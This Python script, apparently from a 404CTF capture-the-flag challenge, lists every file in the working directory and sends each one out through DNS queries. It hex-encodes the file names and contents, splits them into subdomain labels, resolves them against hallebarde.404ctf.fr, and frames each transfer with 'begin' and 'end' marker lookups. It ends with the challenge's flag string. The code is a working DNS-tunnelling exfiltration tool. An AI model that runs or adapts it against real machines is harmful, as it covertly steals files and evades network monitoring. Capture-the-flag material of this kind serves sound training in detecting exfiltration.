import binascii
import os
import dns.resolver
import time

def read_file(filename):
    with open(filename, "rb") as f:
        return binascii.hexlify(f.read())


def exfiltrate_file(filename):
    dns.resolver.resolve("never-gonna-give-you-up.hallebarde.404ctf.fr")
    time.sleep(0.1)
    dns.resolver.resolve(binascii.hexlify(filename.encode()).decode() + ".hallebarde.404ctf.fr")
    content = read_file(filename)
    time.sleep(0.1)
    dns.resolver.resolve("626567696E.hallebarde.404ctf.fr")
    time.sleep(0.1)
    for i in range(len(content)//32):
        hostname = content[i * 32: i * 32 + 32].decode()
        dns.resolver.resolve(hostname + ".hallebarde.404ctf.fr")
        time.sleep(0.1)
    if len(content) > (len(content)//32)*32:
        hostname = content[(len(content)//32)*32:].decode()
        dns.resolver.resolve(hostname + ".hallebarde.404ctf.fr")
        time.sleep(0.1)
    dns.resolver.resolve("656E64.hallebarde.404ctf.fr")
    time.sleep(60)


if __name__ == "__main__":
    files = os.listdir()
    print(files)
    for file in files:
        print(file)
        exfiltrate_file(file)


flag = """404CTF{t3l3ch4rg3m3n7_b1z4rr3}"""
